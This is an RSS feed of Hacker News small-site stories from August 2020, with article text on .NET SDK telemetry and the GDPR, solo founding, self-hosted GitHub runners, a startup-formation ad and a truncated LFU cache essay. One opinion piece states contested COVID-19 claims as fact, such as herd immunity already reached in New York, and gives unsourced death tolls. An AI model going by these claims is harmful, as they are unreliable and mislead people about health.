<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 25 Aug 2020 12:26:48 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 25 Aug 2020 12:26:48 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Microsoft .NET SDK is violating the GDPR, object now]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24251579">thread link</a>) | @dgl
<br/>
August 23, 2020 | https://dgl.cx/2020/08/dotnet-sdk-gdpr | <a href="https://web.archive.org/web/*/https://dgl.cx/2020/08/dotnet-sdk-gdpr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p><b>Skip to the end if you just want a template for a "Right to object"
letter.</b></p>

<p>The .NET Core software development kit (SDK) is a set of command line tools
that allow development against Microsoft's .NET. When the command line tool is
run it sends some telemetry back to Microsoft.</p>

<p>This telemetry is <a href="https://aka.ms/dotnet-cli-telemetry">documented</a>, however the way it is implemented appears
against the <a href="https://gdpr-info.eu/">GDPR</a> in multiple ways.</p>

<h3>Collection by default</h3>

<p>Running <code>dotnet help</code> on a clean install, will print a message about telemetry,
but will send the details on that run.</p>

<p><a href="https://dgl.cx/2020/08/dotnet-help.png"><img src="https://dgl.cx/2020/08/dotnet-help.png"></a></p>

<p>Therefore the GDPR requriements under <a href="https://gdpr-info.eu/recitals/no-42/">"Burden of proof and requirements for
consent"</a> cannot be met -- even if we
give Microsoft the benefit of doubt and consider a command line application
somewhat special, it does not give us a chance to opt-out, yet alone opt-in.</p>

<p><a href="https://dgl.cx/2020/08/dotnet-installer.png"><img src="https://dgl.cx/2020/08/dotnet-installer.png"></a></p>

<p>During the installation process, there is a link to Microsoft's <a href="https://privacy.microsoft.com/en-gb/privacystatement">Privacy
statement</a>, however this
does not mention the environment variable needed to opt-out, so there is no way
to opt out before the first piece of data is sent.</p>

<h3>Collecting personal data</h3>

<p>The linked information page, as well as the text printed  in the CLI both say "The data is
anonymous.", it clearly isn't. They collect MAC addresses and the current
working directory, which are sent to their servers hashed.</p>

<p>A key thing to understand: <b>Hashing without a salt does not make the data
anonymous or even pseudonymous.</b></p>

<p>See for example <a href="https://medium.com/@alexewerlof/gdpr-pseudonymization-techniques-62f7b3b46a56">GDPR pseudonymisation
techniques</a>.
Given this, it is a clear violation as <a href="https://gdpr-info.eu/art-6-gdpr/">Article
6</a> requires specific purposes for processing,
but the data was claimed to be anonymous, which it isn't.</p>

<p>A common place to run "dotnet help" might be a home directory, which can often
include a username, e.g. <code>/home/dgl</code>. So while it's hashed it is easily
possible to find the hash that relates to a particular user:</p>

<pre><code>$ pwd
/home/dgl
$ echo -n $PWD | sha256sum
67acfe0ddd44867e1e5da5ddaf25a5b90e928f523cecf614e201c683b7533cf6  -
</code>
</pre>

<p>This matches the relevant part of the JSON sent:</p>

<pre><code>  "Current Path Hash": "67acfe0ddd44867e1e5da5ddaf25a5b90e928f523cecf614e201c683b7533cf6",
</code></pre>

<p>There are some discussions about the collection of MAC addresses in
<a href="https://github.com/dotnet/sdk/issues/6145">issue #6145</a> but no
particular reply from Microsoft; people suspect it's a GDPR violation. Note
that under the GDPR there are time limits for replying, so that's another
potential GDPR issue.</p>

<p>The <a href="https://dgl.cx/2020/08/ms-report.txt">report</a> I sent to Microsoft detailed how a
MAC address is likely not even 48-bits of search space, as we know what ones
are assigned, so brute-forcing is quite possible, particularly when combined
with the fact the search space can be reduced by filtering on the path
hash.</p>

<p>One principle of the GDPR is you need to explain why you're collecting
information, Microsoft do in a round about way, rather than on the link
printed by the command (<a href="https://aka.ms/dotnet-cli-telemetry">https://aka.ms/dotnet-cli-telemetry</a>) which explains what they are collecting, the "why" is hidden on a <a href="https://devblogs.microsoft.com/dotnet/what-weve-learned-from-net-core-sdk-telemetry/">blog post</a>.</p><p>

It says:
</p><blockquote>
Hashed MAC address â€” Determine a cryptographically (SHA256) anonymous and unique ID for a machine. Useful to determine the aggregate number of machines that use .NET Core. This data will not be shared in the public data releases.
<p>

Hashed current working directory â€” Determine build machines from dev machines using the heuristic of a large number of working directories. This distinction helps explain large #s of builds from a machine.
</p></blockquote>


<p>This shows a clear intention to join the data, for some purposes. The "Hashed
MAC address" is obviously understood to be somewhat sensitive as it mentions
they won't share it. Interestingly the same is not said for the current working
directory, which is also sensitive.</p>

<h3>Privacy policy</h3>

<p>As mentioned Microsoft has a <a href="https://privacy.microsoft.com/en-gb/privacystatement">general privacy policy</a>.</p>

<p>This could allow some collection, however:</p>

<blockquote>
You have choices when it comes to the technology you use and the data you
share. When we ask you to provide personal data, you can decline.
</blockquote>

<p>This behaviour would be GDPR compliant, but the key point is due to the first
collection behaviour of e.g. running <code>dotnet help</code> there is no chance to
decline. So the behaviour of the dotnet tool is inconsistent with their own
privacy policy.</p>

<h3>How to respond?</h3>

<p>I sent a report to Microsoft's security team, because arguably incorrect use of
a cryptographic hashing function (SHA256 of the items, without a salt) is a
"Security Design Flaw" which qualifies under the <a href="https://www.microsoft.com/en-us/msrc/bounty-dot-net-core">dotnet 
bug bounty</a>. This was
obviously fishing a bit, and Microsoft denied me. More surpsingly they don't
seem to consider this a problem at all, their final reply was:</p>

<blockquote>
We have updates scheduled for the first run experience and related documentation to make it more accurate. Personal data is handled consistently with GDPR requirements.
</blockquote>

<p>You'll notice that they don't talk about any actual collection changes. Also
interestingly if the data is anonymous as they claim, what "Personal data" are
they referring to in this reply?</p>

<h4>What's the route the GDPR gives us here?</h4>

<p>This is an interesting one, partly <a href="https://gdpr-info.eu/art-11-gdpr/">Article 11 Processing which does not
  require identification</a> could apply, in that they can exclude themselves
from right of access, etc. With the exception of "Right to object".</p>

<p>There are two routes, either we give enough information for Microsoft to be
happy we identify ourselves (and use the right to erasure), or we use the right
to object, which while it doesn't require Microsoft to delete the data
entirely does require them to limit their use of it.</p>

<p>So I can object to any processing of my data, and as I've proved we can use
the MAC address to find my machine in their data. I believe given this has gone
on for several years that even if they make the data collection GDPR compliant,
there is a huge historical collection of data that may need clearing as it has
been collected unlawfully.</p>

<p>In my original <a href="https://dgl.cx/2020/08/ms-report.txt">report</a> to Microsoft I made some recommendations:</p>

<pre><code>
Recommendations:
<ul><li>Remove the telemetry, it avoids any potential GDPR issues;</li>
<li>Delete the historical data (I am not a lawyer, but I suspect this has GDPR
implications);
</li></ul></code></pre>

<p>It appears they do not intend to follow these so I suggest that any user of
.NET Core SDK in the European Union takes matters into their own hands and use
their right to object:</p>

<div>
<p>
[Your full address]
[The date]</p>

<p>To Data Controller, Microsoft Corporation</p>

<p>I am exercising my right to object under the General Data Protection
Regulation (Article 21).</p>

<p>It has come to my attention that Microsoft .NET Core SDK collects telemetry,
and the opt-out process for this data is flawed.</p>

<p>In particular setting the <code>DOTNET_CLI_TELEMETRY_OPTOUT</code> variable
is only suggested the first time the tool is run, so some data may have been
collected against my will.</p>

<p>In light of Microsoft not deleting this telemetry data for everyone (per the
report of David Leadbeater on 3 August 2020). I wish that my telemetry data is
restricted from further processing, as I have set the opt-out environment
variable, but I cannot be sure that some data has not reached Microsoft
already.</p>

<p>The MAC addresses of my machine(s) is/are:</p>

<p>XX:XX:XX:XX:XX:XX</p>

<p>I believe this is enough to identify my records, as they are stored as a
SHA256 hash of this MAC address.</p>

<p>Please send a full response within one calendar month confirming if you will
comply with my request. If you cannot respond within that timescale, please
tell me when you will be able to respond.</p>

<p>If there is anything you would like to discuss, please contact me.</p>

<p>Thank you,
</p></div>

<p>Obviously the somewhat strange thing about this is you reveal your MAC
address to Microsoft in the process, but I'm fairly sure the data protection
around GDPR requests is something that is well scrutinized.</p>

<p>If you do want to send this to Microsoft go to
<a href="https://www.microsoft.com/en-GB/concern/privacy">https://www.microsoft.com/en-GB/concern/privacy</a> and select "I want to contact
Microsoftâ€™s Data Protection Officer".</p>

<p>It's strange this is still an issue as this was previously discussed over
two years ago (see this <a href="https://news.ycombinator.com/item?id=17177241">Hacker News
thread</a>). Let's use our right to object!</p>

</div></div>]]>
            </description>
            <link>https://dgl.cx/2020/08/dotnet-sdk-gdpr</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251579</guid>
            <pubDate>Sun, 23 Aug 2020 12:57:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Persisting as a Solo Founder]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 29 (<a href="https://news.ycombinator.com/item?id=24251403">thread link</a>) | @vishnumohandas
<br/>
August 23, 2020 | https://vishnu.tech/posts/persistence/ | <a href="https://web.archive.org/web/*/https://vishnu.tech/posts/persistence/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><img src="https://sa.vishnu.tech/noscript.gif" alt="">




    



  



    
    <p><time itemprop="datePublished">August 19, 2020</time>
    </p>
    

<p>I quit my job in January 2020 to build a privacy friendly photo organizer.</p>

<p>As a 30 year old whose friends are either getting married or planning
off-springs, what I had underestimated was the difficulty involved in finding a co-founder and how that would compound the difficulty involved in
finding an investor.</p>

<p>Once I accepted the loneliness and the lack of a financial cushion I had to figure out a way to keep building without burning myself out.</p>

<p>It took me a while, but I have found a rhythm that works, and with it, a steady
source of endorphins. Here are some changes that helped me to keep things
moving.</p>

<h2 id="being-patient">Being patient</h2>

<p>Life is no longer as comfortable as it used to be and things are not always
going the way I want them to. Preseverance has been key and indirectly patience
too. Naval’s <a href="https://twitter.com/naval/status/1261481752448524289" target="_blank">take on
meditation</a> (60 minutes x
60 days), was an eye opener. I’ve stuck with it since, and I now have an easier
time identifying negative thought patterns and sitting out situations that would
otherwise overwhelm me.</p>

<p>On some level, spending the last few months locked indoors with my parents, who
are not the most rational people in the world has also helped. But I wouldn’t
recommend it.</p>

<h2 id="reducing-procrastination">Reducing procrastination</h2>

<p>Over time I’ve realized that action precedes motivation and procrastination precedes guilt.</p>

<p>Breaking down tasks into chunks that seem trivial to accomplish has helped reduce the friction in getting started on unexciting grunt work.</p>

<p>Then there are tasks which I loathe from my core, like writing out applications
to VCs explaining why what I’m doing will matter. To those I attach reinforcing
personal reasons, like, “I need the $50k to hire that college junior who I love
working with, and that will give me spare bandwidth to focus on traction channels”.</p>

<h2 id="thinking-clearer">Thinking clearer</h2>

<p>It is sub-optimal to not have a coworker to bounce ideas off and rant about problems to. A lot of times it’s these conversations that help you gain clarity.</p>

<p>It’s a luxury I do not have so every time I feel stuck, I type/scribble my thoughts out, and then question everything that was written, and then document my realizations.</p>

<p>Task tracking has also helped in clearing the path. I write down unstructured
thoughts into a diary, and once I’ve clarity, I promote them to a Notion board
(that’s divided into <em>Thinking</em>, <em>Building</em>, <em>Reading</em>, <em>Writing</em> and
<em>Adulting</em>) and every Monday within an Excel sheet I track what was done, and
what is left to be done.</p>

<h2 id="reducing-distractions">Reducing distractions</h2>

<p>I’ve reduced my information consumption to free up brain cycles. I’ve disabled all notifications on my phone barring a few contacts, and I’ve more or less stopped browsing on it. As an added bonus, this has reduced the negativity with which I perceived the world.</p>

<p>To minimize the overhead of context switches, I split tasks into a tree of checkpoints. Before taking a break I note down the next simplest checkpoint so that when I get back to work there’s little friction to resume.</p>

<p>To help me zone out I keep <a href="https://www.youtube.com/watch?v=5qap5aO4i9A" target="_blank">lofi
beats</a> or
<a href="http://github.audio/" target="_blank">github.audio</a> playing in the background. Listening to the
latter gives me a strange sense of motivation and makes me feel less alone.</p>

<h2 id="staying-grounded">Staying grounded</h2>

<p>I’m lucky to have some friends who call/text every other week. I look at them as my accountability partners and I talk to them about what I’m doing on a high level. While not all of them genuinely care, some do, and these conversations force me to reflect on how well I’m doing what I’m doing.</p>

<p>While Silicon Valley wisdom suggests that if I’m not sleeping I should be
working, failing because of a burn out would be stupid. An advantage of not
having a VC onboard so far has been the freedom to dictate my pace. So I spend
days thinking, reading, fiddling with my violin or just doing nothing when I
feel like writing code is not what I want to do.</p>

<hr>

<p>It’s been 7 months of building alone, and while this is not how I pictured things to be on my last day at work, this is the happiest I have ever been. There’s a long way to go, and the grind seems inviting.</p>

<p>This list is by no means exhaustive, for I’m still learning. If you’ve
anything to share, please join <a href="https://news.ycombinator.com/item?id=24251403" target="_blank">the discussion on HackerNews</a>.</p>

<hr>

<p>If you are curious about what I’ve been building, check out
<a href="https://ente.io/" target="_blank">ente.io</a>.</p>

    <br>
    


</div>]]>
            </description>
            <link>https://vishnu.tech/posts/persistence/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251403</guid>
            <pubDate>Sun, 23 Aug 2020 12:27:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Five biggest lies about Covid-19-#fakesciencenews-on right&left is deadly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24251261">thread link</a>) | @gloriosoc
<br/>
August 23, 2020 | https://realscience.community/2020/08/23/the-five-biggest-lies-about-covid-19-spread-by-the-media-how-the-fakesciencenews-on-both-the-right-and-the-left-is-killing-americans/ | <a href="https://web.archive.org/web/*/https://realscience.community/2020/08/23/the-five-biggest-lies-about-covid-19-spread-by-the-media-how-the-fakesciencenews-on-both-the-right-and-the-left-is-killing-americans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div id="speakaboutWrapper"><p>Since the beginning of the pandemic, I have noticed the incredible misinformation being spread in the lay news. From the New York Times, to CNN, to Fox News, to Donald Trump himself- GIANT, OBVIOUS, LIES and ERRORS have been spread to the public. From Masks don’t work, to Hydroxychloroquine is an effective drug, to COVID-19 is a hoax, to antibodies won’t last, to the latest set of lies- herd immunity isn’t happening– all giant lies– on both sides of the aisle. Many of these have been attributed to scientists or academics with one line out-of-context quotes, throwing us under the bus, saying things we didn’t say, blatantly misconstruing or outright not understanding the <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> behind basic concepts. The lies always fall along party lines and are aimed at manipulating the public for a political agenda. Scientists have become both pawns and scapegoats to the media and politicians. I am really, really, tired of it. And it is <strong>literally KILLING Americans.</strong></p>



<p>Without facts, we can’t have rationale policy and people can’t make informed, consenting, decisions about their health. The media lies have created mass public confusion and engendered incredible mistrust of the media, politicians, and scientists and doctors (the people the public can and should trust). All the while the scientific community has had a clear eyed unchanging picture of this pandemic the whole time. The virus is not so complicated. The modeling of the virus is actually not so complicated. But if you are listening to the press, it’s a huge messy complicated whiplash of completely untrustworthy information. </p>



<p>So here are the <span><strong>Five Biggest Lies </strong></span>about COVID-19 spread by the press and politicians:</p>



<p>1.<strong>Masks don’t work. </strong></p>



<p><strong>Who spread this?</strong> Everyone. </p>



<p><strong>Why?</strong> To manipulate the public into not buying N95 masks so health care workers would have them. </p>



<p><strong>What was the harm?</strong> It made millions of Americans not believe masks work when the media about faced on this later, killing 10s of thousands. 30% less people would die if everyone wore masks. </p>



<p><strong>2. Hydroxychloroquine works.</strong></p>



<p><strong>Who spread this?</strong> Trump and the right. </p>



<p><strong>Why?</strong> I really can’t fucking figure it out for the life of me. Trump has some financial interest in the drug? You tell me.</p>



<p><strong>What was the harm?</strong> People around the world took a bogus drug with real <a href="https://realscience.community/2020/08/09/elementor-1270/">harmful side effects to their hearts and livers</a>. They also had a false sense of security that there is a treatment for COVID.</p>



<p>Some politicians (below for Ted Cruz statement), have finally admitted the harm in Hydroxycholorquine saying it directly is killing people but still cling to promoting the drug for earlier treatment despite the rigorous clinical trials showing no benefit and indeed harm with the drug. <a href="https://thetexan.news/ted-cruz-letter-to-fda-says-hydroxychloroquine-restrictions-may-be-directly-costing-lives/">https://thetexan.news/ted-cruz-letter-to-fda-says-hydroxychloroquine-restrictions-may-be-directly-costing-lives/</a>.</p>



<p><strong>3. COVID-19 is a hoax.</strong></p>



<p><strong>Who spread this?</strong> Trump and the right.</p>



<p><strong>Why?</strong> My suspicion is that they care more about keeping businesses (and their own finances) intact than saving human lives. So they want people to think COVID-19 is not dangerous so people will continue to spend money.</p>



<p><strong>What was the harm?</strong> People went about their lives in many states like the virus wasn’t harmful. This killed 100,000 more people than necessary. COVID-19 has already killed 6X the number of people this year than the flu has on average in any given year. It also very well might encourage people not to get a COVID vaccine when it becomes available- which we very much need to do.</p>



<p><strong>4. Antibodies won’t last so herd immunity might not be possible.</strong></p>



<p><strong>Who spread this?</strong> The left using scientists as pawns. Here is a quote from a review in the journal, Nature, the number one <a href="https://realscience.community/wiki/science/" target="_blank" title="From Wikipedia, the free encyclopedia. This article is about a branch of knowledge. For other uses, see&nbsp;Science (disambiguation). Science&nbsp;(from the&nbsp;Latin&nbsp;word&nbsp;scientia, meaning &quot;knowledge&quot;)[1]&nbsp;is a systematic enterprise that builds and organizes&nbsp;knowledge&nbsp;in the form of&nbsp;testable&nbsp;explanations&nbsp;and&nbsp;predictions&nbsp;about the&nbsp;universe.[2][3][4] The earliest roots of science can be traced to&nbsp;Ancient Egypt&nbsp;and&nbsp;Mesopotamia&nbsp;in around 3500 to 3000 BCE.[5][6]&nbsp;Their contributions to&nbsp;mathematics,&nbsp;astronomy, and&nbsp;medicine&nbsp;entered and shaped Greek&nbsp;natural philosophy&nbsp;of&nbsp;classical…">science</a> journal in the world. Please note the use of “predictable” in the tagline- “Viral Immunologists say that results so far have been predictable- Here’s why that’s good news”. <strong>This pandemic has not been mysterious to scientists.</strong></p>







<figure><blockquote><p>“Several major media outlets reported this as a loss of immunity, saying that it would complicate vaccine efforts.Many immunologists found that declaration a bit premature, however. The data showed a perfectly normal response to a viral infection, says Luis Barreiro at the University of Chicago in Illinois, who studies the evolution of immune responses to pathogens. When a virus attacks, it spurs the proliferation of B cells that produce antibodies capable of recognizing pieces of the virus. But once the infection is gone, antibody levels typically wane. “There is a lot of fear out there,” says Miles Carroll, an infectious-disease specialist with Public Health England in Porton Down, UK. “But I think, on the whole, that it’s a fairly robust immune response.””</p><cite>~Nature NEWS&nbsp;&nbsp;17 AUGUST 2020<p><a href="https://www.nature.com/articles/d41586-020-02400-7">What the immune response to the coronavirus says about the prospects for a vaccine<br>Viral immunologists say that results so far have been predictable — here’s why that’s good news.</a></p></cite></blockquote></figure><p><strong>5. Herd immunity isn’t happening because there are still cases. </strong></p>



<p><strong>Who is spreading this?</strong> The left and Cuomo and crew. <a href="https://www.cnn.com/2020/08/21/health/coronavirus-immunity-frieden-opinion/index.html">CNN</a> and the <a href="https://www.latimes.com/california/story/2020-08-11/san-quentin-coronavirus-herd-immunity-covid-19?fbclid=IwAR3hDfD6XqUIv7vydOLl5cga3mlKV_TOgh0eqrgZVpMNDeBGocpC6tI8UKI">LA Times</a> have blatant lies in papers in the last two days. Here is a quote from CNN showing that they are lying about what herd immunity is. </p>



<figure><blockquote><p>“But can herd immunity result from 20-30% infection, as some misguided academics suggested recently—far lower than the usual estimate of 60-80% infection? Don’t count on it. Some communities already have a 50% infection rate or higher — this would be impossible if herd immunity kicked in at a 20-30% infection rate!”</p></blockquote></figure><p>Herd immunity means cases go down, RT&lt;1, not that they disappear or that more immunity isn’t possible. This definition is literally in <a href="https://en.wikipedia.org/wiki/Herd_immunity">Wikipedia</a>.</p>



<p>Herd immunity <a href="https://realscience.community/2020/08/17/why-i-believe-the-us-has-herd-immunity-in-some-states-and-is-barreling-towards-it-as-a-country/">is almost certainly happening</a>. <a href="https://realscience.community/2020/08/19/all-signs-point-to-herd-immunity-happening-in-parts-of-the-us-what-are-the-practical-implications/">And that is a good reason to wear a mask and not open schools. </a>Things aren’t safe yet but could be soon- we need to be careful for one more semester and ride this out- but also have hope that things will be better soon.</p>



<p><strong>Why? </strong>Because they want to protect Andrew Cuomo from the wrath of the public finding out that NYC has had herd immunity all along. They also want to point fingers at the right that their cases are going up because they are holier than thou and are using that politically. </p>



<p><strong>What is the harm?</strong> It gives the public the exact opposite impression of what is happening. New York is amongst the safer states now and Michigan is amongst the least safe. States with schools opening that do not yet have immunity should 100% not open. University of Michigan, with your 60k plus students, do not open! Take a clue from UNC Chapel Hill shutting down after one week of classes. </p>



<p>This reckless, abhorrent, blatantly false, characterization of COVID-19 and public health messaging is incredibly harmful. It has killed ~100,000 Americans. The press and politicians on both sides of the aisle need to be held accountable for this. #fakesciencenews</p>
</div>
					</div></div>]]>
            </description>
            <link>https://realscience.community/2020/08/23/the-five-biggest-lies-about-covid-19-spread-by-the-media-how-the-fakesciencenews-on-both-the-right-and-the-left-is-killing-americans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251261</guid>
            <pubDate>Sun, 23 Aug 2020 11:54:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Self-Hosted GitHub Runners]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24251250">thread link</a>) | @shusson
<br/>
August 23, 2020 | https://shusson.info/post/self-hosted-github-runners | <a href="https://web.archive.org/web/*/https://shusson.info/post/self-hosted-github-runners">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  

<p><strong>23/08/2020</strong></p>

<p><img src="https://shusson.info/assets/potato.png" alt="potato"></p>

<p>Currently, github runners are hosted on azure <a href="https://docs.github.com/en/actions/reference/virtual-environments-for-github-hosted-runners">Standard_DS2_v2 VMs</a>. They have 2vCPU 7GB RAM and 14GB SSD.</p>

<p>You can self-host a runner by installing the runner service on your own infrastructure. Self-hosted runners incur no costs on github and allow you to leverage the actions api. Of course you’ll be paying for your own infrastructure, but often this will be cheaper than burning through github minutes. If you’ve got a couple idle ubuntu boxes lying around the office it’s an easy win.</p>

<p>I would recommend using a ramdisk for the workers <code>_work</code> dir as it will dramatically increase IO. Since our tests are ephemeral anyway, we don’t care if there is data loss in the <code>_work</code> directory. Any important files can be persisted using <a href="https://docs.github.com/en/actions/configuring-and-managing-workflows/persisting-workflow-data-using-artifacts">github artifacts</a>.</p>

<p>If your workflow is a <a href="https://docs.github.com/en/actions/configuring-and-managing-workflows/about-service-containers#running-jobs-in-a-container">container-job</a>, then the only dependencies are ubuntu and docker. Assuming you’ve got stock ubuntu 18.04 installed:</p>

<pre><code>sudo apt update
sudo apt install -y docker.io
sudo systemctl start docker
sudo systemctl enable docker
# requires reboot
sudo usermod -a -G docker fred


# create a ramdisk for the runners work dir
mkdir /home/fred/ramdisk
sudo chown -R fred /home/fred/ramdisk

# requires reboot
echo "tmpfs /home/fred/ramdisk tmpfs   defaults,size=3000M,nosuid,uid=1000,gid=1000   0 0" | sudo tee -a /etc/fstab

# set up the github runner
# in this example we are installing a runner to a repository, you can also install it for a org
# more info https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners
mkdir actions-runner
cd actions-runner
# note the version will most likely change in the future
curl -O -L https://github.com/actions/runner/releases/download/v2.272.0/actions-runner-linux-x64-2.272.0.tar.gz
tar xzf ./actions-runner-linux-x64-2.272.0.tar.gz
# you can find the token here: https://github.com/&lt;org&gt;/&lt;repo&gt;/settings/actions/add-new-runner
./config.sh --url https://github.com/&lt;org&gt;/&lt;repo&gt; --token "${GITHUB_TOKEN}" --name "${RUNNER_NAME}" --work /home/fred/ramdisk  --unattended  --replace
sudo ./svc.sh install
sudo ./svc.sh start
sudo ./svc.sh status
sudo reboot
</code></pre>

<p>And that’s it. You should now see the runner in your repo: e.g <code>https://github.com/&lt;org&gt;/&lt;repo&gt;/settings/actions</code></p>

<p>To tie your workflow to a self-hosted runner, use a label e.g</p>

<pre><code>jobs:
    server_tests:
        runs-on: [self-hosted, enabled]
</code></pre>

<p>You might be wondering if you can host the github runner in a docker container. Unfortunately not all features are supported yet, so depending on your workflow you might have <a href="https://github.com/actions/runner/issues/406">issues</a>.</p>

      

  <span><time datetime="2020-08-23T00:00:00+02:00"></time></span>


  
  <!--<span class="meta"><time datetime="2020-08-23T00:00:00+02:00">August 23, 2020</time> &middot; </span>
  -->
</section></div>]]>
            </description>
            <link>https://shusson.info/post/self-hosted-github-runners</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251250</guid>
            <pubDate>Sun, 23 Aug 2020 11:52:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stripe Atlas vs. Startomatic]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24251206">thread link</a>) | @RobbieStats
<br/>
August 23, 2020 | https://startomatic.com/stripe-atlas-alternative.html | <a href="https://web.archive.org/web/*/https://startomatic.com/stripe-atlas-alternative.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">
      





<!-- Pricing Section -->
<div>


  <!-- Title -->
  <div>
    <p><strong>Startomatic perspective:</strong></p>

<p>Stripe Atlas is a startup formation product aimed at venture capital-backed companies. These companies typically need somewhat complex legal documents allowing for outside investment, multiple types of equity, and equity compensation. Stripe Atlas only allows formation of Delaware C-corporations. They also offer to set up a US bank account for users.</p>

<p>For companies not planning to immediately raise outside investment, Stripe Atlas is somewhat expensive and offers limited choices - you cannot form an S-corporations, LLC, or entity in any state other than Delaware.</p>

<p>Stripe Atlas does not offer logo, website, trademark searches, domain name registration, company email, SEO help, or any of the numerous other features included in Startomatic’s flat fee.</p>

<p>If you are not planning to immediately raise money from professional investors, you’re not operating in Delaware, and/or you need services other than legal formation documents and a bank account, Stripe Atlas may not be a good choice. Startomatic is both less expensive and provides significantly more features, including the ability to incorporate in all 50 states.</p>

  </div>
  <!-- End Title -->

  <!-- Table -->
  
  <!-- End Table -->

    

</div>
<!-- End Pricing Section -->


    </div></div>]]>
            </description>
            <link>https://startomatic.com/stripe-atlas-alternative.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251206</guid>
            <pubDate>Sun, 23 Aug 2020 11:41:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Constant Time LFU]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24251182">thread link</a>) | @arpitbbhayani
<br/>
August 23, 2020 | https://arpitbhayani.me/blogs/lfu | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/lfu">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>A common strategy to make any system super-performant is <em><a href="https://en.wikipedia.org/wiki/Cache_(computing)">Caching</a>.</em> Almost all software products, operating at scale, have multiple layers of caches in their architectures. Caching, when done right, does wonder to the response time and is one of the main reasons why products work so well at a massive scale. Cache engines are limited by the amount of memory available and hence once it gets full the engine has to decide which item should be evicted and that is where an eviction algorithm, like <a href="https://en.wikipedia.org/wiki/Least_frequently_used">LFU</a> and <a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a>. kicks in.</p>
<p><a href="https://en.wikipedia.org/wiki/Cache_replacement_policies#Least_recently_used_(LRU)">LRU</a> (Least Recently Used) cache eviction strategy is one of the most popular strategies out there. LFU (Least Frequently Used) strategy fares well in some use cases but a concern with its most popular implementation, where it uses a min-heap, is that it provides a running time complexity of <code>O(log n)</code> for all the three operations - insert, update and delete; because of which, more often than not, it is replaced with a sub-optimal yet extremely fast <code>O(1)</code> LRU eviction scheme.</p>
<p>In this essay, we take a look at Constant Time LFU implementation based on the paper <a href="http://dhruvbird.com/lfu.pdf">An O(1) algorithm for implementing the LFU cache eviction scheme</a> by Prof. Ketan Shah, Anirban Mitra and Dhruv Matani, where instead of using a min-heap, it uses a combination of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">doubly-linked lists</a> and <a href="https://en.wikipedia.org/wiki/Hash_table">hash table</a> to gain a running time complexity of <code>O(1)</code> for all the three core operations.</p>

<p>LFU, very commonly, is implemented using a <a href="https://en.wikipedia.org/wiki/Min-max_heap">min-heap</a> which is organized as per the frequency of access of each element. Each element of this heap holds a pair - cached value and the access frequency; and is structured in order of this frequency such that the cached value with the minimum access frequency sits at the top, making it quick to identify the element to be evicted.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/89717235-0fd1f900-d9d2-11ea-968d-9ed67f52a2db.png" alt="min-heap LFU"></p>
